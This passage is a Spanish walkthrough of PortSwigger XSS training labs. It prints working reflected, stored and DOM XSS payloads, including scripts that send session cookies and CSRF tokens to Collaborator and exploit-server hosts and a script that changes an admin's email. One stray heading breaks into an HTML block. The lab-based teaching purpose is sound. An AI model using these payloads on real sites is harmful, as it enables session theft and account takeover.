El objetivo aqu√≠ es vulnerar el bot√≥n **`Back to blog`**, en el cual, si pasamos el cursor por encima (*hovering*), podemos observar lo siguiente:
```javascript
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=2'}).finally(_ => window.location = '/')">Back to Blog</a>
```

Adem√°s, tenemos control sobre el par√°metro `postId` en la URL de la p√°gina, por lo que podemos intentar aprovecharlo para salir del contexto del par√°metro `method` que se le pasa a la funci√≥n `fetch`.  

Si introducimos un valor distinto a un n√∫mero en dicho par√°metro, obtenemos un error.  
Por ejemplo, si intentamos escapar con algo como `2'},{x'` para salir del contexto del `{method}` que vemos en segundo plano, la aplicaci√≥n devuelve el mensaje **"invalid post ID"**.  

No obstante, podemos comprobar qu√© caracteres nos permite inyectar en este campo. Una manera de hacerlo es mediante **wfuzz**, utilizando un comando como el siguiente:
```bash
wfuzz -c -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt 'https://0a5100de03c05be0816c21fb00e8002a.web-security-academy.net/post?postId=2FUZZ%27},{x:%27}'
```

El resultado del fuzzing nos devuelve dos s√≠mbolos con c√≥digo de estado **200**: `&` y `#`.  

Si, por ejemplo, probamos a realizar la siguiente petici√≥n:  
```bash
https://0a5100de03c05be0816c21fb00e8002a.web-security-academy.net/post?postId=2&'},{x:'
```


esta vez no se genera un error.  

A partir de esto ya sabemos que es posible escapar el contexto del par√°metro. Adem√°s, teniendo en cuenta que en **JavaScript**, si a una funci√≥n se le pasan m√°s par√°metros de los esperados, en lugar de fallar simplemente los procesa, podemos aprovecharlo para inyectar una funci√≥n y conseguir un **XSS**.  

Para incrementar la dificultad del laboratorio, se nos impide utilizar par√©ntesis `()`, ya que al escribirlos en la URL son eliminados.  
Por este motivo no podemos ejecutar directamente algo como `alert(0)`.  

La soluci√≥n es recurrir a algunos trucos en JavaScript que permiten crear una funci√≥n que dispare un `alert` sin necesidad de usar par√©ntesis. Un ejemplo es el siguiente bloque de c√≥digo:  

```javascript
x = x =>{
    throw onerror=alert,1337
}
toString = x
window + ''
```

En este caso:

- Se crea una funci√≥n de tipo arrow function.
- Se sobrescribe el m√©todo nativo de JavaScript toString.
- Gracias a esto, al ejecutar la operaci√≥n window + '', internamente se fuerza la llamada a toString, lo que provoca la ejecuci√≥n del alert.

Todo este c√≥digo lo unimos en una sola l√≠nea y lo insertamos entre los caracteres que hab√≠amos utilizado para escapar del contexto.  

De esta forma, el payload final queda as√≠:
```bash
&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

## Lab 29

**XSS reflejado protegido por CSP muy estricto, con dangling markup attack**

En esta ocasi√≥n, se nos proporcionan unas credenciales con las que debemos realizar un ataque de tipo **CSRF**.  

Si iniciamos sesi√≥n con dichas credenciales e inspeccionamos el c√≥digo, observamos que el campo del formulario para cambiar el correo tiene la siguiente estructura:
```html
<input required type="email" name="email" value="">
```

Dado que el valor que se introduce en este campo puede ser controlado directamente desde la URL mediante `?email=`, podemos intentar salir del contexto del atributo `value`.

Por ejemplo, utilizando `test">`
```html
<input required type="email" name="email" value="test">">
```

Podr√≠amos intentar, por ejemplo, insertar un `alert` directamente, pero como hemos visto anteriormente, el **CSP** lo bloquea.  

No obstante, podemos aprovechar la estrategia de escapar del contexto para cerrar el formulario original, crear uno nuevo e insertar un bot√≥n. De esta manera, cuando un usuario haga clic en √©l, se enviar√° su **CSRF token** a nuestro servidor malicioso.  

Este ataque se puede construir de la siguiente manera:
```html
test"></form><form class="xss" name="xssForm" action="https://exploit-0a02003b0380f95a815b88f801570050.exploit-server.net/exploit" method="GET"><button class="button" type="submit">Click</button>
```

Podemos colocar este c√≥digo en nuestro **exploit server** para capturar el **CSRF token** del usuario:
```html
<script>
    location='https://0ada00da03cdf96481b889e5003b00a9.web-security-academy.net/my-account?email=test"></form><form class="xss" name="xssForm" action="https://exploit-0a02003b0380f95a815b88f801570050.exploit-server.net/exploit" method="GET"><button class="button" type=""submit">Click</button';
</script>
```

Si revisamos los logs, podemos comprobar que efectivamente hemos robado el **CSRF token** `NN3MCLpwdU3aN05snRyrqN7JeTTLC1E6`.

Sin embargo, al intentar usar este token en **Burp Suite** para cambiar el correo de la v√≠ctima, nos damos cuenta de que est√° vinculado a la **cookie de sesi√≥n** del usuario, por lo que no nos permite realizar la acci√≥n.
<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.35.png" width="1000"/>
</div>

Sin embargo, podemos forzar al usuario a enviar directamente la petici√≥n al acceder a nuestro **servidor malicioso**.  

Esto se puede realizar de manera r√°pida, ya que **Burp Suite** proporciona un **PoC para CSRF tokens**, el cual genera autom√°ticamente el c√≥digo que debemos colocar en nuestro **exploit server** para completar el laboratorio.
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ada00da03cdf96481b889e5003b00a9.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil-user.net" />
      <input type="hidden" name="csrf" value="NN3MCLpwdU3aN05snRyrqN7JeTTLC1E6" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

De esta manera, el laboratorio queda completado exitosamente.

## Lab 30

**XSS reflejado protegido por CSP, con omisi√≥n de CSP**

En este escenario, nos encontramos nuevamente con el mismo panel de b√∫squeda que hemos visto en laboratorios anteriores.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

Una vez m√°s, la aplicaci√≥n interpreta cualquier tipo de etiqueta HTML, pero bloquea la ejecuci√≥n de cualquier funci√≥n en JavaScript debido al **CSP**.  

Sin embargo, si revisamos los **headers** en la pesta√±a de Red, observamos que el CSP depende de una **cookie** obtenida a partir de un par√°metro `token`.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.36.png" width="1000"/>
</div>

Esto resulta potencialmente peligroso, ya que podemos controlar el valor de este **token** mediante la URL.
Podemos intentar escapar del contexto y modificar el CSP.  

Por ejemplo, si introducimos en el campo de b√∫squeda:
```html
<script>alert(0)</script>
```

y lo concatenamos con `&token=;script-src-elem 'unsafe-inline'` para escapar del contexto y modificar el CSP, veremos que ahora s√≠ se ejecuta el `alert`.

# üíæ **XSS Almacenado**

El **XSS almacenado** ocurre cuando el input malicioso de un atacante se guarda en el servidor (por ejemplo, en una base de datos, archivo de logs o sistema de comentarios) y luego es mostrado a otros usuarios sin una validaci√≥n ni escape adecuados.

Esto significa que cada vez que otro usuario visite la p√°gina vulnerable, el payload malicioso se ejecutar√° autom√°ticamente en su navegador.

## üîë **Caracter√≠sticas clave**

- El payload se almacena en el servidor (base de datos, comentarios, perfiles, foros, etc.).
- Se ejecuta autom√°ticamente cuando otros usuarios acceden a la p√°gina afectada.
- No requiere que la v√≠ctima haga clic en un enlace malicioso (a diferencia del reflejado).
- Tiene un impacto mayor, ya que puede afectar a todos los usuarios que vean el contenido.
- Se suele usar para robar cookies, tokens CSRF o credenciales 

Al igual que en el resto, para explicar este tipo de ataque, iremos resolviendo de forma progresiva todos los laboratorios que est√©n relacionados con esta t√©cnica.

## Lab 2

**XSS almacenado en contexto HTML sin nada codificado**

En este laboratorio, nos encontramos con el mismo panel de comentario que veremos en el resto de laboratorios.

## Lab 8

**XSS almacenado en el atributo `href` con comillas dobles codificadas en HTML**

En este laboratorio, nos encontramos con el mismo panel de comentario que hemos visto en laboratorios anteriores.

Si rellenamos todo de la siguiente manera:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.22.png" width="1000"/>
</div>

Vemos los siguiente

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.23.png" width="1000"/>
</div>

Si hacemos *hovering* sobre el campo `Website`, observamos que nos redirige a `http://test.com`.  
Esto indica que la aplicaci√≥n est√° interpretando directamente el valor de este campo y utiliz√°ndolo como un enlace.  

Si probamos a inyectar HTML en otros campos, como por ejemplo `<h1>test</h1>`, vemos que se muestra como **texto plano**, lo que nos lleva a intuir que el campo `Website` es el √∫nico vulnerable.  

Con esta idea en mente, podemos intentar inyectar algo como:  

```javascript
javascript:alert(0);
```

Al guardar el comentario y hacer click en el enlace, se ejecuta el `alert`, confirmando la vulnerabilidad **XSS**.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-alert.png" width="1000"/>
</div>

## Lab 13

**XSS almacenado basado en el DOM**

Este laboratorio podr√≠a entrar tanto en la categor√≠a de **XSS almacenado** como en la de **XSS basado en DOM**, pero por simplicidad lo incluiremos aqu√≠.

En este laboratorio, nos encontramos con el mismo panel de comentario que hemos visto en laboratorios anteriores.

Si probamos a introducir payloads como en ocasiones anteriores, observamos un comportamiento extra√±o.  
Por ejemplo, al inyectar la etiqueta:  

```html
<script>alert(0)</script>
```
vemos que no se interpreta directamente en el navegador como ocurr√≠a en otros laboratorios, lo que sugiere que la aplicaci√≥n est√° aplicando alg√∫n tipo de filtrado o sanitizaci√≥n parcial.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.24.png" width="1000"/>
</div>

Como podemos ver, la etiqueta `</script>` del final falta.  
Si inspeccionamos el c√≥digo fuente de la p√°gina, vemos el siguiente c√≥digo en **JavaScript**:
```javascript
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();

    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }

    function displayComments(comments) {
        let userComments = document.getElementById("user-comments");

        for (let i = 0; i < comments.length; ++i)
        {
            comment = comments[i];
            let commentSection = document.createElement("section");
            commentSection.setAttribute("class", "comment");

            let firstPElement = document.createElement("p");

            let avatarImgElement = document.createElement("img");
            avatarImgElement.setAttribute("class", "avatar");
            avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");

            if (comment.author) {
                if (comment.website) {
                    let websiteElement = document.createElement("a");
                    websiteElement.setAttribute("id", "author");
                    websiteElement.setAttribute("href", comment.website);
                    firstPElement.appendChild(websiteElement)
                }

                let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
                firstPElement.innerHTML = newInnerHtml
            }

            if (comment.date) {
                let dateObj = new Date(comment.date)
                let month = '' + (dateObj.getMonth() + 1);
                let day = '' + dateObj.getDate();
                let year = dateObj.getFullYear();

                if (month.length < 2)
                    month = '0' + month;
                if (day.length < 2)
                    day = '0' + day;

                dateStr = [day, month, year].join('-');

                let newInnerHtml = firstPElement.innerHTML + " | " + dateStr
                firstPElement.innerHTML = newInnerHtml
            }

            firstPElement.appendChild(avatarImgElement);

            commentSection.appendChild(firstPElement);

            if (comment.body) {
                let commentBodyPElement = document.createElement("p");
                commentBodyPElement.innerHTML = escapeHTML(comment.body);

                commentSection.appendChild(commentBodyPElement);
            }
            commentSection.appendChild(document.createElement("p"));

            userComments.appendChild(commentSection);
        }
    }
};
```

La estructura, nos recuerda un poco al [Lab 14](#lab-14), pero en este caso lo que se est√° haciendo es coger la informaci√≥n de una ruta donde se guardan los comentarios para despu√©s procesarlos antes de mostrarlos.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.25.png" width="1000"/>
</div>

Si analizamos un poco m√°s su comportamiento, vemos que lo que est√° haciendo es uso de una funci√≥n `replace`, para HTML encodear los primeros `<>` que se encuentre.  

El problema est√° en que **no reemplaza todos los `<>`**, sino √∫nicamente los primeros que aparezcan en el contenido.  
Esto abre la puerta a que, si insertamos varias etiquetas, solo las primeras queden "neutralizadas", mientras que las siguientes se interpretan de manera normal.

Podemos comprobar este comportamiento directamente desde la consola del navegador con un ejemplo como este:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.26.png" width="1000"/>
</div>

Podemos intentar a√±adir unos `<>` antes de la etiqueta `<script>`, de forma que el `replace` solo encodee esos y no la propia etiqueta.  

Si inyectamos:

```html
<><script>alert(0)</script>
```

<div style="text-align: ce
**XSS almacenado en contexto HTML sin nada codificado**
nter;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.27.png" width="1000"/>
</div>

Es bastante extra√±o, pero si inspeccionamos el c√≥digo fuente, vemos que las etiquetas `<script>` s√≠ se han introducido, aunque no se interpretan.  

Por ello, podemos intentar otro tipo de XSS para que s√≠ se ejecute. Siguiendo la t√©cnica de otros labs, podemos forzar la carga de una imagen err√≥nea para provocar un error:

```html
<><img src=1 onerror=alert(0)>
```

Ahora s√≠, al enviar, aparece el `alert(0)`.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-alert.png" width="1000"/>
</div>

## Lab 20

**XSS almacenado en el evento ¬´onclick¬ª con corchetes angulares y comillas dobles codificados en HTML y comillas simples y barras invertidas escapadas**

En este laboratorio, nos encontramos con el mismo panel de comentario que hemos visto en laboratorios anteriores.

Si probamos a introducir algo como:
```html
<script>alert(0)</script>
```

y luego inspeccionamos el c√≥digo fuente de la p√°gina, vemos que el contenido se HTML encodea, impidiendo que se ejecute directamente el `alert`.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.28.png" width="1000"/>
</div>

Si ponemos, por ejemplo, `test` en todos los campos, observamos lo siguiente:
```html
<a id="author" href="http://test.com" onclick="var tracker={track(){}};tracker.track('http://test.com');">test</a>
```

Si introducimos, por ejemplo, `test"`, tambi√©n se **HTML encodea**.
```html
<a id="author" href="http://test&quot;" onclick="var tracker={track(){}};tracker.track('http://test&quot;');">test</a>
```

Y, si probamos a escapar el contexto con una comilla simple, se comporta de la siguiente manera:
```html
<a id="author" href="http://test\'" onclick="var tracker={track(){}};tracker.track('http://test\'');">test</a>
```

Lo siguiente que podemos probar es insertar directamente en el campo de la URL un payload codificado en HTML por nosotros, para evitar que se realice cualquier tratamiento autom√°tico y as√≠ verificar si podemos conseguir la inyecci√≥n.

Vamos a probar con esto:

```bash
http://xss?&apos;+alert(0)+&apos
```

Haciendo uso del par√°metro, la URL real ser√≠a:
```bash
http://xss?'+alert(0)+'
```

Esto se interpreta correctamente, ya que si solo ponemos `''`, los caracteres son escapados autom√°ticamente.

Al enviar la URL y hacer clic en el enlace, podemos observar c√≥mo aparece el alert.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-alert.png" width="1000"/>
</div>

## Lab 22

**XSS para robar cookies**

En este laboratorio, nos encontramos con el mismo panel de comentario que hemos visto en laboratorios anteriores.

No obstante, en este caso no hay ning√∫n tipo de sanitizaci√≥n implementada, lo que facilita la obtenci√≥n de la cookie de sesi√≥n de manera r√°pida.  

En esta ocasi√≥n, se nos solicita utilizar **Burp Suite Collaborator** junto con un **XSS malicioso**, de manera que cuando el administrador haga clic en un post, su cookie de sesi√≥n sea enviada a nuestro servidor malicioso. Esto nos permitir√≠a suplantar su identidad y convertirnos en administrador.

Podemos insertar el siguiente script en uno de los campos:
```javascript
<script>
    fetch("https://oogverr83gutrn4x7bzqk03xhonfb8zx.oastify.com?cookie=" + document.cookie);
</script>
```
<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.29.png" width="1000"/>
</div>

Si hacemos clic en **Post** y luego revisamos nuestro **Burp Suite Collaborator**, podemos observar lo siguiente:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.30.png" width="1000"/>
</div>

Hemos recibido una petici√≥n HTTP en nuestro servidor en la que, a trav√©s de un par√°metro, se nos est√° transmitiendo la cookie de sesi√≥n del administrador.  

De esta manera, podemos reemplazar nuestra propia cookie por la del administrador y completar el laboratorio con √©xito.

## Lab 24

**XSS para eludir las defensas CSRF**

En este laboratorio se nos proporcionan unas credenciales de usuario, ya que nuestro objetivo es robar un **token CSRF** para poder cambiar el correo del administrador.  

Si navegamos al apartado de **Mi cuenta**, observamos lo siguiente:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.31.png" width="1000"/>
</div>

Si inspeccionamos el c√≥digo fuente de la p√°gina, podemos observar que, cuando estamos en esta pesta√±a, existe un campo oculto que contiene un **token CSRF**. Con esta informaci√≥n, vamos a intentar auditar al administrador.

Una vez m√°s, en este laboratorio nos encontramos con el mismo panel de comentarios que hemos visto en laboratorios anteriores.

Al igual que en [Lab 22](#lab-22), ninguno de los campos presenta ning√∫n tipo de **sanitizaci√≥n**, lo que facilita el proceso. Podemos utilizar **Burp Suite Collaborator** para intentar que, al hacer clic en el post, el administrador nos env√≠e su token CSRF a nuestro dominio. Esto se puede lograr mediante un poco de **scripting en JavaScript**.
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4 && xhr.status == 200) {
    var match = xhr.responseText.match(/name="csrf" value="([^"]+)"/);
    if (match) {
      var token = match[1];
      fetch("https://o4td1u9eyu8v2snh3i7433j66xcp0fo4.oastify.com?token=" + encodeURIComponent(token));
    }
  }
};
xhr.open("GET", "/my-account", true);
xhr.send();
``` 

Una vez publicado este comentario, si revisamos **Burp Suite Collaborator**, podemos observar que hemos recibido el **token CSRF**.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.32.png" width="1000"/>
</div>

Sin embargo, si intentamos realizar ahora una petici√≥n de cambio de correo mediante **Burp Suite** utilizando este token CSRF, observamos que no funciona, ya que cada vez se genera uno nuevo.  

Por lo tanto, ser√° necesario modificar el script para que, de forma directa, se robe el token y se realice la petici√≥n de cambio de correo de manera autom√°tica.
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4 && xhr.status == 200) {
    var match = xhr.responseText.match(/name="csrf" value="([^"]+)"/);
    if (match) {
      var token = match[1];

      // Ahora lanzamos un POST para cambiar el correo del admin
      var params = "email=xss@xss.com&csrf=" + encodeURIComponent(token);

      var xhr2 = new XMLHttpRequest();
      xhr2.open("POST", "/my-account/change-email", true);
      xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr2.send(params);
    }
  }
};
xhr.open("GET", "/my-account", true);
xhr.send();
```
De esta manera, somos capaces de auditar el **token CSRF** y completar con √©xito el laboratorio.

# üå≥ **XSS Basado en el DOM**

El **DOM (Document Object Model)** es una representaci√≥n en forma de √°rbol que los navegadores crean de una p√°gina web.  

El navegador genera un √°rbol donde cada etiqueta (`<html>`, `<body>`, `<p>`, etc.) corresponde a un **nodo**.  

Mediante **JavaScript**, los desarrolladores (y atacantes) pueden acceder y modificar estos nodos utilizando funciones y propiedades como:  

- `innerHTML`  
- `document.write`  
- `location.search`  
- jQuery (selectores y m√©todos) 

A ra√≠z de esto, y en funci√≥n de qu√© funciones o propiedades del **DOM** se est√©n utilizando por detr√°s (por ejemplo `innerHTML`, `document.write`, `location.search`, entre otras), es posible que podamos inyectar c√≥digo malicioso y provocar un **XSS**.  

En este tipo de casos, el ataque no depende tanto de la respuesta directa del servidor, sino de c√≥mo el propio navegador interpreta y ejecuta el c√≥digo JavaScript que manipula el DOM.

Al igual que en el resto, para explicar este tipo de ataque, iremos resolviendo de forma progresiva todos los laboratorios que est√©n relacionados con esta t√©cnica.

## Lab 3

**DOM XSS con `document.write` utilizando `location.search`**

Antes de hacer este laboratorio, conviene explicar la utilidad de dos elementos clave:  

- **document.write**: es un m√©todo de JavaScript que escribe directamente contenido HTML en el documento. Cualquier string que reciba ser√° interpretado como parte del DOM.  
- **location.search**: devuelve la parte de la URL que va despu√©s del signo `?`, incluyendo los par√°metros.  

Si no se realiza una correcta sanitizaci√≥n del valor de `location.search`, y este se pasa directamente a `document.write`, un atacante puede introducir etiquetas arbitrarias.  
Por ejemplo, si en la URL introducimos:  
```html
?search=<script>alert(0)</script>
```

y el c√≥digo hace algo como:  

```javascript
document.write(location.search);
```

entonces el navegador inyectar√° directamente la etiqueta `<script>` dentro del DOM, ejecutando el `alert`.

Una vez entendido esto, vamos a resolver el lab:

En este laboratorio, nos encontramos con el mismo panel de b√∫squeda que hemos visto en laboratorios anteriores.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

Si inspeccionamos el c√≥digo fuente de la p√°gina, vemos la siguiente funci√≥n en JavaScript:
```javascript
<script>
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
</script>
```

Como vemos, coge el valor que tenga en ese momento el par√°metro `searchTerms` y lo escribe directamente en la etiqueta `<img>` modificando as√≠ el DOM.

Si nosotros por ejemplo introducimos algo como:
```html
"><svg onload=alert(0)>
```

lo cual nos permite salir del contexto de la parte del `src` haciendo uso de `">` y despu√©s concatenamos con `<svg onload=alert(0)>`.  

Cuando la imagen intente cargarse, el navegador interpretar√° la inyecci√≥n y nos aparecer√° el pop up del `alert`, confirmando que el XSS funciona correctamente.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-alert.png" width="1000"/>
</div>

Tambi√©n se puede intentar a hacer con las etiquetas `<script></script>`, pero como estamos dentro del contexto de una imagen, es preferible usar `<svg>`.  

De esta manera garantizamos que el payload se ejecute correctamente al cargar el elemento, evitando los problemas que tendr√≠amos al intentar inyectar un `<script>` en un lugar no v√°lido dentro del DOM.

## Lab 4

**DOM XSS con `innerHTML` utilizando `location.search`**

Este laboratorio es parecido al [Lab 3](#lab-3), solo que en este caso se hace uso de `innerHTML`.  
Esta propiedad, en vez de escribir en el DOM como hac√≠a `document.write`, lo que hace es modificar directamente elementos del DOM.  

Por ello, este lab es muy parecido al anterior en cuanto a t√©cnica y vector de explotaci√≥n.

En este laboratorio, nos encontramos con el mismo panel de b√∫squeda que hemos visto en laboratorios anteriores.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

No obstante, si por ejemplo introducimos etiquetas como `<script>alert(0)</script>`, vemos que no tiene efecto.  
Con esto, y viendo que no observamos nada en el c√≥digo fuente, podemos suponer que no es vulnerable a XSS.  

Pero no obstante, hay m√°s maneras de intentar forzar un `alert`.  

Como sabemos, al hacer una b√∫squeda correcta, nos suele aparecer una imagen con el blog que coincida con la b√∫squeda.  
Por ello, podemos forzar a cargar una imagen no v√°lida de la siguiente manera:  

```html
<img src=0 onerror=alert(0)>
```

En este caso, se est√° intentando cargar una imagen de una fuente que es `0`, por lo que obviamente va a dar error.
A ra√≠z de esto, indicamos que si hay error, se ejecute la funci√≥n `alert`.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-alert.png" width="1000"/>
</div>

## Lab 5

**DOM XSS en el atributo `href` con jQuery utilizando la fuente `location.search`**

En el caso de este laboratorio, nos encontramos antes un campo de feedback donde se nos pide que vulneremos el bot√≥n de back.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.17.png" width="1000"/>
</div>

Si inspeccionamos el c√≥digo fuente de la p√°gina, vemos lo siguietne:
```javascript
$(function() {
    $('#backLink').attr(
        "href",
        new URLSearchParams(window.location.search).get('returnPath')
    );
});
```

Este c√≥digo se encarga de tomar el valor que haya despu√©s del par√°metro `returnPath` en la URL y asign√°rselo, haciendo uso de **jQuery**, al bot√≥n de **Back**.  

Por ejemplo, si ponemos `https://google.com` y recargamos la p√°gina, debido a la funci√≥n anterior, `location.search` toma el valor de ese par√°metro y lo asigna al bot√≥n de **Back**.  
De hecho, si hacemos hover sobre el bot√≥n, podemos ver claramente que apunta a `https://google.com`.

Con esto, lo que conseguimos es cambiar el comportamiento del bot√≥n **Back**.  
Si en su lugar ponemos algo como:

```javascript
javascript:alert(document.cookie)
```

al pulsar `Back` despu√©s de recargar la p√°gina, nos aparecer√° un pop-up mostrando `document.cookie`.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-cookie.png" width="1000"/>
</div>

No obstante, inicialmente no nos aparec√≠a nada, ya que si inspeccionamos las cookies pod√≠amos ver que la opci√≥n **HttpOnly** estaba en `true`.  

Si modificamos esta opci√≥n a `false` y repetimos el mismo proceso, entonces s√≠ podemos ver c√≥mo funciona el payload y nos aparece el pop-up con `document.cookie`.

## Lab 6

**DOM XSS en el selector jQuery utilizando un evento `hashchange`**

En este caso, no nos encontramos con ning√∫n panel de b√∫squeda ni campo de feedback como en otros labs. La web presenta un comportamiento diferente.

Si inspeccionamos el c√≥digo fuente de la p√°gina, podemos observar lo siguiente:
```javascript
$(window).on('hashchange', function(){
var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');

if (post) post.get(0).scrollIntoView();
});
```

Aqu√≠ lo que ocurre es que si usamos el selector `#` seguido del nombre de un post, por ejemplo `#Grandma's on the net`, al cargar la URL nos desplazar√° directamente a ese post.  
No obstante, para que esto funcione, necesitamos recargar la URL.

Podemos intentar insertar alguna etiqueta HTML en este campo, ya que lo que realmente busca son etiquetas `<h2>`, por lo que podemos intuir que interpreta HTML.  

Si probamos con:

```html
<script>alert(0);</script>
```

no sucede nada debido a alg√∫n tipo de sanitizaci√≥n.

Sin embargo, si utilizamos:

```html
<img src=0 onerror=alert(0);>
```

vemos que el navegador ejecuta el payload y se dispara el `alert`.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-alert.png" width="1000"/>
</div>

Por lo tanto, podemos confirmar que se pueden realizar inyecciones **XSS**.  

No obstante, como se mencion√≥ anteriormente, para que esto ocurra es necesario que la p√°gina se recargue.  
Para facilitar esto, **PortSwigger** nos proporciona un servidor malicioso donde podemos generar un enlace malicioso y compartirlo con la v√≠ctima, oblig√°ndola a ejecutar los comandos que deseemos.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.18.png" width="1000"/>
</div>

Si hacemos uso de un **iframe**, por ejemplo:  

```html
<iframe src="https://0af700e904719f8080c526b6009e001e.web-security-academy.net/#" width="100%" height="1200"></iframe>
```

y le damos a Ver Exploit, podemos ver exactamente la p√°gina web dentro del iframe, ya que este nos permite mostrar una p√°gina HTML dentro de otra p√°gina HTML.

A ra√≠z de esto, podemos inyectar un payload malicioso en la parte del `<body>` para cargar la p√°gina real con el iframe, de manera que no levante sospechas y podamos forzar un cambio en la URL que provoque la inyecci√≥n XSS:
```html
<iframe src="https://0af700e904719f8080c526b6009e001e.web-security-academy.net/#" width="100%" height="1200" onload="this.src+= '<img src=1 onerror=print()>'"></iframe>
```

Y as√≠, completamos el laboratorio.

## Lab 10

**DOM XSS con `document.write` utilizando la fuente `location.search` dentro de un elemento select**

En este caso, tenemos el siguiente campo vulnerable.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.19.png" width="1000"/>
</div>

Un selector donde, en funci√≥n del pa√≠s que selecciones, se muestra una respuesta u otra.  

Si inspeccionamos el c√≥digo fuente de la p√°gina, podemos observar lo siguiente:
```javascript
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
  document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
      continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

Podemos observar que hay una funci√≥n que toma el valor de un par√°metro `storeId` y lo escribe en la p√°gina.  

Si pasamos la petici√≥n por **Burp Suite**, obtenemos lo siguiente:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.20.png" width="1000"/>
</div>

Si probamos a cambiar `London` por una tienda que no existe, por ejemplo `test`, observamos lo siguiente:

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-lab7.21.png" width="1000"/>
</div>

Como podemos ver, se ha a√±adido `test` como si fuese una tienda m√°s.  
Si inspeccionamos el c√≥digo fuente, no encontramos nada relevante, por lo que debemos usar un poco de imaginaci√≥n.  

Podemos suponer que, por detr√°s, la estructura HTML que controla esto tiene un aspecto similar al siguiente:
```html
<select id="city-select">
  <option value="test">test</option>
  <option value="london">Londres</option>
  <option value="paris">Par√≠s</option>
  <option value="milan">Mil√°n</option>
</select>
```

Por lo tanto, podemos intentar salir del contexto del `<select>` y modificar el DOM.  

Por ejemplo, si introducimos el siguiente payload:

```html
test</option></select><script>alert(0)</script><select>
```
esto provocar√≠a que, por detr√°s, el HTML se reestructure de la siguiente manera:
```html
<select id="city-select">
  <option value="test">test</option>
</select>
<script>alert(0)</script>
<select>
  <option value="london">Londres</option>
  <option value="paris">Par√≠s</option>
  <option value="milan">Mil√°n</option>
</select>
```

Al darle a **enviar**, vemos que se ejecuta el `alert`, confirmando que nuestra intuici√≥n era correcta.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-alert.png" width="1000"/>
</div>

## Lab 11

**DOM XSS en expresiones AngularJS con corchetes angulares y comillas dobles codificadas en HTML**

En este laboratorio, nos encontramos con el mismo panel de b√∫squeda que hemos visto en laboratorios anteriores.

<div style="text-align: center;">
  <img src="{{ site.baseurl }}/assets/xss/xss-search.png" width="1000"/>
</div>

No obstante, da igual lo que escribamos, que no vamos a ver nada en el c√≥digo fuente. No aparece ning√∫n archivo JavaScript ni nada que nos indique el uso de `innerHTML`, `document.write` o `jQuery`.  

Sin embargo, s√≠ podemos observar que la etiqueta `<body ng-app>` engloba casi todo el documento. Adem√°s, si usamos extensiones como **Wappalyzer**, vemos que la aplicaci√≥n est√° utilizando **AngularJS en la versi√≥n 1.7.7**.  

